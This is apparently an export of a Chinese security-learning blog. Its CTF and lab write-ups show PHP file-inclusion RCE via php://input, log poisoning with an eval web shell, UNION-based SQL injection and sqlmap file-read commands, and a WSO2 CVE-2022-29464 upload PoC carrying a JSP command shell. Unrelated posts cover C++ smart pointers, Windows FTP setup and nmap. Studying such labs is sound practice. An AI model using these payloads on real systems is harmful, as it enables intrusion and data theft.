</blockquote>
<h4 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>通过软链接指向允许范围外的文件（需服务器已有软连接配置），实现文件包含。</p>
<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="1-web3"><a href="#1-web3" class="headerlink" title="1.web3"></a>1.web3</h3><p>页面就给一个代码 <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code></p>
<h4 id="抓包-php伪协议"><a href="#抓包-php伪协议" class="headerlink" title="抓包+php伪协议"></a>抓包+php伪协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?url=php://input HTTP/1.1</span><br><span class="line">Host: 71ebeb35-9940-4deb-bd09-9621a4cca6b6.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 23</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;pwd&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>HTTP&#x2F;1.1 200 OK<br>Server: nginx&#x2F;1.18.0 (Ubuntu)<br>Date: Mon, 26 Jun 2023 05:56:07 GMT<br>Content-Type: text&#x2F;html; charset&#x3D;UTF-8<br>Connection: close<br>X-Powered-By: PHP&#x2F;7.3.11<br>Content-Length: 717</p>
<p><strong>&#x2F;var&#x2F;www&#x2F;html</strong><br>&lt;html…..</p>
</blockquote>
<p>如果将请求内容改为ls</p>
<p><code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
<blockquote>
<p>ctf_go_go_go<br>index.php<br>&lt;html lang&#x3D;”zh-CN”&gt;</p>
</blockquote>
<p><code>&lt;?php system(&quot;cat ctf_go_go_go&quot;)?&gt;</code>即可</p>
<h3 id="2-web4"><a href="#2-web4" class="headerlink" title="2.web4"></a>2.web4</h3><p>同样的代码，但是伪协议失效了</p>
<p>尝试直接日志路径&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>发现日志会写进UA头，可以尝试一句话木马，蚁剑连接即可</p>
<blockquote>
<p>…</p>
<p>2023:06:04:58 +0000] “GET &#x2F; HTTP&#x2F;1.1” 200 715 “-“ “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;112.0.0.0 Safari&#x2F;537.36”</p>
<p>…</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?url=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: ed85081d-b185-4ad0-8563-5676806fe548.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>针对文件包含攻击，标准的防护手段及可实现的绕过方式有以下几种：</p>
<p>1）尽可能保持中间件及PHP版本最新，从而有效避免低版本中存在大量利用%00、..&#x2F;..&#x2F;、点号截断的情况。</p>
<p>2）利用配置文件中的目录限制功能对用户可访问的目录进行限制。</p>
<p>3）利用黑白名单进行过滤。</p>
<p>文件包含攻击主要在低版本的PHP中可有效进行。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617215821611.png"></p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>chunqiu</title>
    <url>/2023/07/02/%E6%98%A5%E7%A7%8B/</url>
    <content><![CDATA[<p>学的难受，不实战的话，非常容易忘。</p>
<h1 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h1><h2 id="1-说是登录框页面有sql注入"><a href="#1-说是登录框页面有sql注入" class="headerlink" title="1.说是登录框页面有sql注入"></a>1.说是登录框页面有sql注入</h2><p>登录是邮箱id登录</p>
<p>但是有<strong>注册</strong>功能，忘记密码功能(是一个摆设)。先注册一个进去。</p>
<p>发现是个线上问答系统</p>
<p>f12，发现有提示</p>
<p>&lt;!– Collect the nav links, forms, and other content for toggling –&gt;</p>
<p>那就是功能点home，history，ranking 还有个登出功能</p>
<p>即答题，历史记录，排行榜</p>
<p>先注意到当前页面url有?id&#x3D;1的格式</p>
<p>尝试注入，(单引号，双引号，布尔)没报错，sleep(没反应)</p>
<p>放弃，发现可以进去答题</p>
<p>比如uid&#x3D;123456&amp;q&#x3D;12321&amp;n&#x3D;2&amp;t&#x3D;10</p>
<p>发现，url上参数很多，且每点一次提交，其中一个参数n会变化</p>
<p><strong>尝试n&#x3D;2’&amp;t&#x3D;10，出现了报错。</strong></p>
<blockquote>
<p><strong>Warning</strong>: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;welcome.php</strong> on line <strong>98</strong></p>
</blockquote>
<p><code>n=2&#39;--+</code>有回显，欧克</p>
<p>**2’ order by 6–+ **报错</p>
<p>2’ order by 5–+正常</p>
<p><code>n=-2%27union%20select%201,2,3,4,5--+</code></p>
<p>有一个回显位为3</p>
<p>替换：</p>
<p>database()，为ctf</p>
<p>version(),<strong>10.3.34-MariaDB-0+deb10u1</strong></p>
<p><em>MariaDB</em> 采用<em>MySQL</em> 的数据和表定义文件</p>
<h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><p><code>n=-2%27%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),4,5--+</code>  &#x2F;&#x2F;group_concat</p>
<p><code>n=-2%27%20union%20select%201,2,(select%20concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() limit 0,1),4,5--+</code> &#x2F;&#x2F;concat</p>
<blockquote>
<p>concat返回一行，一般搭配limit</p>
<p>group_concat，拼接各行成为一行输出，长度限制一般1024个字符长度</p>
</blockquote>
<blockquote>
<p><strong>user,options,quiz,admin,questions,history,rank,flag,answer</strong></p>
</blockquote>
<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p><code>n=-2%27%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flag%27),4,5--+</code></p>
<blockquote>
<p>flag</p>
</blockquote>
<p><code>n=-2%27%20union%20select%201,2,(select%20group_concat(flag)%20from%20ctf.flag),4,5--+</code></p>
<blockquote>
<p>欧克</p>
</blockquote>
<h2 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h2><p>内容管理系统</p>
<p>2‘报错</p>
<p>2’–+正常</p>
<p><code>2&#39; order by 1--+</code></p>
<p>…</p>
<h2 id="CVE-2022-28060"><a href="#CVE-2022-28060" class="headerlink" title="CVE-2022-28060"></a>CVE-2022-28060</h2><p>登录框上存在注入；</p>
<p>不会，看了wp，是时间盲注，我不知道怎么试出来的，看了几个wp都是用了sqlmap扫。</p>
<p>(emmm，这手工怎么能发现延时注入呢)</p>
<p><code>python sqlmap.py -u http://eci-2ze6l4gdtbam0rk6gt5e.cloudeci1.ichunqiu.com/includes/login.php</code></p>
<p>没结果。</p>
<blockquote>
<p>–technique:是指定探测技术B:表示布尔盲注,T:表示时间盲注,E:表示报错注入,U:表示联合注入<br>S:表示堆查询注入；利用-v参数指定显示等级，当取最大值等于3时,将显示sqlmap所使用的payload详情<br>-p&#x2F;–skip :指定&#x2F;跳过测试参数</p>
</blockquote>
<p>burp post请求可以用sqlmap文本注入，抓包，数据包全选保存为txt文件。</p>
<p><code>python sqlmap.py -r e:\渗透\111.txt</code></p>
<p>emmm，运行太久了，放弃。</p>
<p>将wp粘贴如下：</p>
<p><code>python sqlmap.py -r 1.txt --sql-shell -v</code></p>
<p><code>select load_file(&#39;/flag&#39;)</code></p>
<p>或</p>
<p><code>sqlmap -r 1.txt --file-read &quot;/flag&quot; --dbms Mysql</code></p>
<blockquote>
<p>-r 1.txt：这个选项告诉sqlmap从1.txt这个文件中读取HTTP请求。<br>–file-read “&#x2F;flag”：这个选项让sqlmap尝试从目标数据库服务器上读取”&#x2F;flag”文件。这个行为可能会被视为一种攻击，因为它可能涉及到未经授权的文件访问。<br>–dbms Mysql：这个选项指定了目标数据库的类型是MySQL。</p>
</blockquote>
<h1 id="2-任意文件上传漏洞"><a href="#2-任意文件上传漏洞" class="headerlink" title="2.任意文件上传漏洞"></a>2.任意文件上传漏洞</h1><p>php+mysql</p>
<p>这是个邮箱登录界面，进行了正则匹配。</p>
<p>但是没有合适的邮箱，错误邮箱提示不存在，bp也没有什么</p>
<blockquote>
<p>email&#x3D;123%401.com&amp;password&#x3D;asd&amp;login&#x3D;</p>
</blockquote>
<p>发现页面底部有</p>
<p>Copyright © 2022 Project Develop by ….可以点击</p>
<p>在页面随便点点，可以找到作者的邮箱</p>
<p><a href="mailto:&#109;&#97;&#121;&#x75;&#x72;&#x69;&#46;&#105;&#110;&#x66;&#111;&#x73;&#x70;&#x61;&#99;&#x65;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#109;&#97;&#121;&#x75;&#x72;&#x69;&#46;&#105;&#110;&#x66;&#111;&#x73;&#x70;&#x61;&#99;&#x65;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
<p>bp构造login&#x3D;0,login&#x3D;1也绕不过去哇</p>
<p>密码那个跳转连接的名字，可以通过</p>
<p>进去后的界面，是个药房管理系统，有各种报告。</p>
<p>其中有导入xlsx文件的地方，尝试个一句话木马</p>
<blockquote>
<p><strong>Warning</strong>: require_once(..&#x2F;libraries&#x2F;phpexcel&#x2F;PHPExcel.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;php_action&#x2F;createBrandImport.php</strong> on line <strong>6</strong></p>
<p><strong>Fatal error</strong>: require_once(): Failed opening required ‘..&#x2F;libraries&#x2F;phpexcel&#x2F;PHPExcel.php’ (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;php_action&#x2F;createBrandImport.php</strong> on line <strong>6</strong></p>
</blockquote>
<p>尝试貌似不行</p>
<p>在产品的管理下，发现产品是有图片的，考虑编辑一下，确实有改变产品图像的地方。上传木马。</p>
<p>不需要绕过；</p>
<p>右键图片，复制图片地址，打开蚁剑了解。</p>
<p>找到根目录的flag文件</p>
<h2 id="CVE-2022-29464"><a href="#CVE-2022-29464" class="headerlink" title="CVE-2022-29464"></a>CVE-2022-29464</h2><p>允许未经身份验证的攻击者通过上传恶意JSP文件在WSO2服务器上获得RCE。</p>
<p>进入登录界面，f12</p>
<blockquote>
<!-- localize.jsp MUST already be included in the calling script -->
</blockquote>
<p>抓包，repeater，粘贴官方poc，上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /fileupload/toolsAny HTTP/1.1</span><br><span class="line">Host: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 896</span><br><span class="line">Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">--4ef9f369a86bfaadf5ec3177278d49c0</span><br><span class="line">Content-Disposition: form-data; name=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/testshell.jsp&quot;; filename=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/testshell.jsp&quot;</span><br><span class="line"> </span><br><span class="line">&lt;FORM&gt;</span><br><span class="line">    &lt;INPUT name=&#x27;cmd&#x27; type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=&#x27;Run&#x27;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    String output = &quot;&quot;;</span><br><span class="line">    if(cmd != null) &#123;</span><br><span class="line">        String s = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(cmd,null,null);</span><br><span class="line">            BufferedReader sI = new BufferedReader(new</span><br><span class="line">InputStreamReader(p.getInputStream()));</span><br><span class="line">            while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;</span><br><span class="line">        &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">        &lt;%=output %&gt;</span><br><span class="line">--4ef9f369a86bfaadf5ec3177278d49c0--</span><br></pre></td></tr></table></figure>

<p>（为什么，repeater后，粘贴这些内容，改一下host，运行go，没有response嘞）</p>
<p>访问名问&#x2F;shelltest.jsp&#x2F;?cmd&#x3D;cat+%2Fflag的路径即可。我没成功</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>智能指针</title>
    <url>/2023/08/14/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><p>智能指针简化资源的管理，从根本上消除资源(内存)泄露的可能；实质上是RAII资源管理功能的自然展现。</p>
<h1 id="代码1"><a href="#代码1" class="headerlink" title="代码1"></a>代码1</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum class</span> <span class="title class_">shape_type</span> &#123;</span><br><span class="line">circle</span><br><span class="line">,</span><br><span class="line">triangle,</span><br><span class="line">rectangle,</span><br><span class="line">…</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">shape</span> &#123; … &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">circle</span> : <span class="keyword">public</span> shape &#123; … &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">triangle</span> : <span class="keyword">public</span> shape &#123; … &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">rectangle</span> : <span class="keyword">public</span> shape &#123; … &#125;;</span><br><span class="line"><span class="function">shape* <span class="title">create_shape</span><span class="params">(shape_type type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">…</span><br><span class="line"><span class="keyword">switch</span> (type) &#123;</span><br><span class="line"><span class="keyword">case</span> shape_type::circle:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">circle</span>(…);</span><br><span class="line"><span class="keyword">case</span> shape_type::triangle:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">triangle</span>(…);</span><br><span class="line"><span class="keyword">case</span> shape_type::rectangle:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">rectangle</span>(…);</span><br><span class="line">…</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了确保在使用 create_shape 的返回值时不会发生内存泄漏</p>
<p>把这个返回值放到一个本地变量里，并确保其析构函数会删除该对象即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">shape</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">shape_wrapper</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   shape* ptr_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">explicit</span> <span class="title">shape_wrapper</span><span class="params">(shape* ptr=<span class="literal">nullptr</span>)</span>:ptr_(ptr)&#123;</span>&#125;;</span><br><span class="line">   ~<span class="built_in">shape_wrapper</span>()&#123;</span><br><span class="line">      <span class="keyword">delete</span> ptr_;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function">shape* <span class="title">get</span><span class="params">()</span> <span class="type">const</span></span>&#123; <span class="keyword">return</span> ptr_; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该代码完成了智能指针的最基本功能： <strong>对超出作用域的对象释放</strong></p>
<p>但其面临的问题有3：</p>
<blockquote>
<p>1.该类只适用于shape类</p>
<p>2.该类对象的行为不够像指针</p>
<p>3.拷贝该类对象会引发程序行为异常</p>
</blockquote>
<p>PS:<code>explicit</code> 其作用是指定仅有一个参数或除第一个参数外其它参数均有默认值的类构造函数不能作为类型转化操作符被隐含的使用，防止该类的对象直接被对应内置类型隐式转化后赋值，从而规定这个构造函数必须被明确调用。</p>
<p><code>shape* ptr=nullptr</code>: 是构造函数的参数列表，其中 <code>shape* ptr</code> 是一个名为 <code>ptr</code> 的指向 <code>shape</code> 类对象的指针参数，<code>=nullptr</code> 是为了提供一个默认参数值（空指针）</p>
<p><code>: ptr_(ptr)</code>: 这是构造函数的初始化列表，用于初始化成员变量。<code>ptr_</code> 是类的成员变量，通过初始化列表将构造函数的参数 <code>ptr</code> 赋值给了成员变量 <code>ptr_</code>。</p>
<h1 id="代码2"><a href="#代码2" class="headerlink" title="代码2"></a>代码2</h1><p><code>模板化和易用性</code></p>
<p>要让这个类能够包装任意类型的指针，我们需要把它变成一个类模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">template &lt;typename T&gt;</span><br><span class="line">class smart_ptr</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">   explicit smart_ptr(T *ptr = nullptr)</span><br><span class="line">       : ptr_(ptr) &#123;&#125;</span><br><span class="line">   ~smart_ptr()</span><br><span class="line">   &#123;</span><br><span class="line">      delete ptr_;</span><br><span class="line">   &#125;</span><br><span class="line">   T *get() const &#123; return ptr_; &#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">   T *ptr_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但是该类的行为与指针还是有点差异：</p>
<blockquote>
<p>不能用*运算符解引用</p>
<p>不能用-&gt;运算符指向对象成员</p>
<p>不能像指针一样用在布尔表达式里</p>
</blockquote>
<p>解决办法：添加成员函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">smart_ptr</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> …</span><br><span class="line"> T&amp; <span class="keyword">operator</span>*() <span class="type">const</span> &#123; <span class="keyword">return</span> *ptr_; &#125;</span><br><span class="line"> T* <span class="keyword">operator</span>-&gt;() <span class="type">const</span> &#123; <span class="keyword">return</span> ptr_; &#125;</span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">bool</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> ptr_; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="代码3"><a href="#代码3" class="headerlink" title="代码3"></a>代码3</h1><p>拷贝构造和赋值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//声明指针类型(smart_ptr&lt;shape&gt;)+变量名(ptr1)+&#123;指针值&#125;</span><br><span class="line">smart_ptr&lt;shape&gt;ptr1&#123;create_shape(shape_type::circle)&#125;;</span><br><span class="line">smart_ptr&lt;shape&gt; ptr2&#123;ptr1&#125;;</span><br><span class="line">//等价于以下语句</span><br><span class="line">//smart_ptr&lt;shape&gt; ptr2 = ptr1;</span><br></pre></td></tr></table></figure>

<p>对于第二行，究竟应当让编译时发生错误，还是可以有一个更合理的行为</p>
<blockquote>
<p>可以理解为，由于第二行是调用拷贝构造函数的行为</p>
<p>有两种可能：</p>
<p>1.调用默认拷贝构造函数，可能导致错误</p>
<p>因为拷贝构造函数已经被删除（<code>=delete</code>），这将导致编译错误</p>
<p>2.调用自定义拷贝构造函数，可能有不同结果</p>
</blockquote>
<p>先引入一下<strong>拷贝构造函数</strong>，一个空类，系统会默认给四个函数，构造、析构、拷贝构造函数和赋值运算符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">private:</span><br><span class="line">    char* name;  // 指向姓名的指针</span><br><span class="line">public:</span><br><span class="line">    // 构造函数</span><br><span class="line">    Person(const char* n) &#123;</span><br><span class="line">        name = new char[strlen(n) + 1];</span><br><span class="line">        strcpy(name, n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 拷贝构造函数</span><br><span class="line">    Person(const Person&amp; other) &#123;</span><br><span class="line">        name = new char[strlen(other.name) + 1];</span><br><span class="line">        strcpy(name, other.name);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	  Person person1(&quot;Alice&quot;);</span><br><span class="line">    Person person2 = person1;  // 调用拷贝构造函数，复制 //person1 的内容到 person2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Person person2 = person1;</code> 尝试创建一个新的 <code>smart_ptr</code> 对象 <code>person2</code> 并用 <code>person1</code> 的值进行初始化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">class smart_ptr</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">   explicit smart_ptr(T *ptr = nullptr):ptr_(ptr) &#123;</span><br><span class="line">       cout&lt;&lt;&quot;construct!&quot;&lt;&lt;endl;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   ~smart_ptr()</span><br><span class="line">   &#123;</span><br><span class="line">       cout&lt;&lt;&quot;delete~&quot;&lt;&lt;endl;</span><br><span class="line">      delete ptr_;</span><br><span class="line">   &#125;</span><br><span class="line">   T *get() const &#123; return ptr_; &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">   T *ptr_;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //创建smart对象去管理int类型的指针</span><br><span class="line">    smart_ptr&lt;int&gt; ptr1(new int(42));</span><br><span class="line">    smart_ptr&lt;int&gt; ptr2=ptr1;</span><br><span class="line">    cout&lt;&lt;*ptr1.get()&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;*ptr2.get()&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>construct!<br>42<br>42<br>delete~<br>delete~</p>
</blockquote>
<p>首先尝试禁止拷贝</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">template &lt;typename T&gt;</span><br><span class="line">class smart_ptr &#123;</span><br><span class="line">…</span><br><span class="line">smart_ptr(const smart_ptr&amp;)=delete;</span><br><span class="line">smart_ptr&amp; operator=(const smart_ptr&amp;)=delete;</span><br><span class="line">…</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>smart_ptr&amp; operator=(const smart_ptr&amp;)=delete;</code></p>
<p>导致默认拷贝构造函数调用失败</p>
<p>由于智能指针的目的就是减少对象的拷贝；且没有通用的方法可以通过基类的指针来构造出一个子类的对象</p>
]]></content>
      <categories>
        <category>C++</category>
        <category>智能指针</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>智能指针</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器搭建</title>
    <url>/2023/06/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="一、win10"><a href="#一、win10" class="headerlink" title="一、win10"></a>一、win10</h1><h2 id="1-ftp服务器"><a href="#1-ftp服务器" class="headerlink" title="1.ftp服务器"></a>1.ftp服务器</h2><h3 id="a-作用"><a href="#a-作用" class="headerlink" title="a.作用"></a>a.作用</h3><p>互联网上提供文件存储和访问服务的计算机，用来传递、保存和分发文件给各个客户端。</p>
<h3 id="b-配置步骤"><a href="#b-配置步骤" class="headerlink" title="b.配置步骤"></a>b.配置步骤</h3><h4 id="1）设置防火墙"><a href="#1）设置防火墙" class="headerlink" title="1）设置防火墙"></a>1）设置防火墙</h4><p>控制面板-&gt;windows defender-&gt;允许应用或功能通过windows defender，勾选ftp服务器即可</p>
<p><img src="/../../../Typora/img111/image-20230612203153980.png" alt="image-20230612203153980"></p>
<h4 id="2-启用windows功能"><a href="#2-启用windows功能" class="headerlink" title="2)启用windows功能"></a>2)启用windows功能</h4><p>控制面板-&gt;程序和功能-&gt;启用或关闭windows功能-&gt;internet information services-&gt;勾选ftp服务器</p>
<h4 id="3-本地建立存放文件的文件夹"><a href="#3-本地建立存放文件的文件夹" class="headerlink" title="3)本地建立存放文件的文件夹"></a>3)本地建立存放文件的文件夹</h4><ol>
<li><p>建立文件夹，如我的E:\final</p>
</li>
<li><p>右键该文件夹属性-&gt;安全-&gt;编辑-&gt;勾选完全控制（authenticed user下）</p>
</li>
<li><p>win+r compmgmtlauncher，计算机管理 -&gt; 系统工具 -&gt; 本地用户和组-&gt;新建用户(yuleiyun,123123)，右键查看属性，是隶属于Users组的</p>
</li>
<li><p>可以新建一个ftpGroups组，然后令yuleiyun只隶属于该组</p>
<blockquote>
<p>（但我没有本地用户和组，通过mmc添加也失败了，百度说是因为win10家庭版没有该功能，那我只能先升级专业版了）</p>
</blockquote>
<p>找到一个有效密钥升级后，激活下即可</p>
<p><a href="https://zhuanlan.zhihu.com/p/605819151">WIN10专业版系统激活2023.2.13 - 知乎 (zhihu.com)</a></p>
</li>
</ol>
<h4 id="4-搭建ftp服务器"><a href="#4-搭建ftp服务器" class="headerlink" title="4)搭建ftp服务器"></a>4)搭建ftp服务器</h4><p>打开win中s搜索iis并打开，</p>
<p><img src="/../../../Typora/img111/image-20230612212130227.png"></p>
<p>IP地址设为本机IP地址</p>
<p><img src="/../../../Typora/img111/image-20230612212236451.png"></p>
<p><img src="/../../../Typora/img111/image-20230612213155655.png"></p>
<p>然后去物理路径中，即E:&#x2F;final，设置下文件夹权限，添加组即可</p>
<p><img src="/../../../Typora/img111/image-20230612213414869.png"></p>
<p>服务里要启动下micro…ftp服务，再去IIS启动ftp服务器</p>
<p><img src="/../../../Typora/img111/image-20230612213728587.png" alt="image-20230612213728587"></p>
<h4 id="5-验证"><a href="#5-验证" class="headerlink" title="5)验证"></a>5)验证</h4><p><img src="/../../../Typora/img111/image-20230612214423630.png" alt="image-20230612214423630"></p>
<p><img src="/../../../Typora/img111/image-20230612214234726.png" alt="image-20230612214234726"></p>
<p> 为什么在edge浏览器中输入ftp:&#x2F;&#x2F;本机IP 时，让打开360浏览器呢</p>
<h2 id="2-总结"><a href="#2-总结" class="headerlink" title="2.总结"></a>2.总结</h2><p>搭建ftp服务器，使得局域网下的各主机可以传递、下载并存储文件。</p>
]]></content>
      <categories>
        <category>服务器搭建</category>
      </categories>
      <tags>
        <tag>服务器搭建</tag>
        <tag>ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透工具</title>
    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="一、nmp"><a href="#一、nmp" class="headerlink" title="一、nmp"></a>一、nmp</h2><h3 id="1-nmap是什么"><a href="#1-nmap是什么" class="headerlink" title="1.nmap是什么"></a>1.nmap是什么</h3><p>是一款检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息的专业工具</p>
<h3 id="2-运行环境"><a href="#2-运行环境" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
<h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3.功能"></a>3.功能</h3><ol>
<li><p>主机发现功能：向目标计算机发送特制的数据包组合，然后根据目标的反应来确定它是否处于开机并连接到网络的状态。</p>
</li>
<li><p>端口扫描：向目标计算机的指定端口发送特制的数据包组合，然后根据目标端口的反应来判断它是否开放。</p>
</li>
<li><p>服务及版本检测：向目标计算机的目标端口发送特制的数据包组合，然后根据目标的反应来检测它运行服务的服务类型和版本。</p>
</li>
<li><p>操作系统检测：向目标计算机发送特制的数据包组合，然后根据目标的反应来检测它的操作系统类型和版本。</p>
</li>
</ol>
